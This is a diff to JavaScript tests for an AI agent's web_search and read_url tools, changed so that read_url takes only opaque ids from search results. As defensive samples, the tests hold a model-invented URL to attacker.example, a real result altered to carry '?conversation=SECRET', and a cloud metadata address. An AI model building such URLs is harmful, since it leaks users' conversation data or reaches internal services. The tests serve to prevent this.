@@ -7,6 +7,12 @@ const RESULTS = [
   { title: "Tom's Hardware", url: "https://th.com/b", description: "Panel comparison." },
 ];
 
+const resultId = (searchResult, position = 1) => {
+  const match = searchResult.content.match(new RegExp(`^${position}\\. \\[id: ([0-9a-f-]{36})\\]`, "m"));
+  assert.ok(match, `search result ${position} did not expose an opaque id`);
+  return match[1];
+};
+
 const full = (over = {}) =>
   buildRegistry({
     search: async () => RESULTS,
@@ -141,6 +147,7 @@ test("web_search renders results the model can act on", async () => {
   assert.equal(r.ok, true);
   assert.ok(r.content.includes("rtings.com/a"));
   assert.ok(r.content.includes("RTINGS OLED"));
+  resultId(r);
 });
 
 test("web_search accepts the Tavily {results:[…]} shape as well as a bare array", async () => {
@@ -231,8 +238,8 @@ test("read_url passes the URL through the guard before fetching", async () => {
     readUrl: async (safe) => { fetched = safe.url.toString(); return "body"; },
     assertSafeUrl: async (u) => { guarded = u; return { url: new URL(u), address: "93.184.216.34", family: 4 }; },
   });
-  await reg.execute({ name: "web_search", args: { query: "x" } });
-  await reg.execute({ name: "read_url", args: { url: "https://example.com/x" } });
+  const search = await reg.execute({ name: "web_search", args: { query: "x" } });
+  await reg.execute({ name: "read_url", args: { id: resultId(search) } });
   assert.equal(guarded, "https://example.com/x");
   assert.ok(fetched.startsWith("https://example.com/x"));
 });
@@ -240,10 +247,12 @@ test("read_url passes the URL through the guard before fetching", async () => {
 test("a blocked URL never reaches the fetcher", async () => {
   let fetched = false;
   const reg = buildRegistry({
+    search: async () => [{ title: "metadata", url: "http://metadata.internal/", description: "x" }],
     readUrl: async () => { fetched = true; return "secrets"; },
     assertSafeUrl: async () => { throw new Error("resolves to 169.254.169.254, which is a private or reserved address."); },
   });
-  const r = await reg.execute({ name: "read_url", args: { url: "http://metadata.internal/" } });
+  const search = await reg.execute({ name: "web_search", args: { query: "metadata" } });
+  const r = await reg.execute({ name: "read_url", args: { id: resultId(search) } });
   assert.equal(fetched, false, "the guard must run BEFORE the fetch, not alongside it");
   assert.equal(r.ok, false);
   assert.ok(r.summary.includes("169.254.169.254"));
@@ -257,29 +266,31 @@ test("read_url can only read an exact URL returned by this turn's search", async
     assertSafeUrl: async (url) => ({ url: new URL(url), address: "93.184.216.34", family: 4 }),
   });
 
-  const direct = await reg.execute({ name: "read_url", args: { url: "https://attacker.example/collect" } });
+  const direct = await reg.execute({ name: "read_url", args: { id: "99999999-8888-4777-8666-555555555555" } });
   assert.equal(direct.ok, false);
   assert.equal(fetched, false, "a model-invented URL reached the network");
 
-  await reg.execute({ name: "web_search", args: { query: "allowed page" } });
-  const allowed = await reg.execute({ name: "read_url", args: { url: "https://allowed.example/page" } });
+  const search = await reg.execute({ name: "web_search", args: { query: "allowed page" } });
+  const allowed = await reg.execute({ name: "read_url", args: { id: resultId(search) } });
   assert.equal(allowed.ok, true);
   assert.equal(fetched, true);
 });
 
-test("a search-result URL cannot be changed into an exfiltration request", async () => {
+test("read_url rejects a model-authored URL even when it changes a real result", async () => {
   let fetched = null;
+  let guarded = false;
   const reg = buildRegistry({
     search: async () => [{ title: "Page", url: "https://allowed.example/page", description: "x" }],
     readUrl: async (safe) => { fetched = safe; return "body"; },
-    assertSafeUrl: async (url) => ({ url: new URL(url), address: "93.184.216.34", family: 4 }),
+    assertSafeUrl: async (url) => { guarded = true; return { url: new URL(url), address: "93.184.216.34", family: 4 }; },
   });
   await reg.execute({ name: "web_search", args: { query: "page" } });
   const result = await reg.execute({
     name: "read_url",
-    args: { url: "https://allowed.example/page?conversation=SECRET" },
+    args: { id: "https://allowed.example/page?conversation=SECRET" },
   });
   assert.equal(result.ok, false);
+  assert.equal(guarded, false, "a forged address reached DNS validation");
   assert.equal(fetched, null, "conversation text left through a modified URL");
 });
 
@@ -290,8 +301,8 @@ test("read_url gives the fetcher the address that was actually vetted", async ()
     readUrl: async (safe, opts) => { received = { safe, opts }; return "body"; },
     assertSafeUrl: async (url) => ({ url: new URL(url), address: "93.184.216.34", family: 4 }),
   });
-  await reg.execute({ name: "web_search", args: { query: "page" } });
-  await reg.execute({ name: "read_url", args: { url: "https://allowed.example/page" } });
+  const search = await reg.execute({ name: "web_search", args: { query: "page" } });
+  await reg.execute({ name: "read_url", args: { id: resultId(search) } });
   assert.equal(received.safe.address, "93.184.216.34");
   assert.equal(received.safe.family, 4);
   assert.equal(received.opts.assertSafeUrl instanceof Function, true, "redirect hops cannot be revalidated");
@@ -305,8 +316,8 @@ test("read_url renders the structured reader result and reports its final host a
     readUrl: async () => ({ body: "final body", finalUrl: "https://www.allowed.example/final", status: 200 }),
     assertSafeUrl: async (url) => ({ url: new URL(url), address: "93.184.216.34", family: 4 }),
   });
-  await reg.execute({ name: "web_search", args: { query: "page" } });
-  const result = await reg.execute({ name: "read_url", args: { url: "https://allowed.example/page" } });
+  const search = await reg.execute({ name: "web_search", args: { query: "page" } });
+  const result = await reg.execute({ name: "read_url", args: { id: resultId(search) } });
   assert.equal(result.ok, true);
   assert.equal(result.content, "final body");
   assert.equal(result.summary, "Read www.allowed.example (HTTP 200)");
@@ -349,8 +360,8 @@ test("a result too large for a prompt is truncated and says so", async () => {
     readUrl: async () => "y".repeat(50000),
     assertSafeUrl: async (u) => ({ url: new URL(u), address: "93.184.216.34", family: 4 }),
   });
-  await reg.execute({ name: "web_search", args: { query: "x" } });
-  const r = await reg.execute({ name: "read_url", args: { url: "https://e.test" } });
+  const search = await reg.execute({ name: "web_search", args: { query: "x" } });
+  const r = await reg.execute({ name: "read_url", args: { id: resultId(search) } });
   assert.ok(r.content.length < MAX_RESULT_CHARS + 100);
   assert.ok(r.content.includes("truncated"));
 });
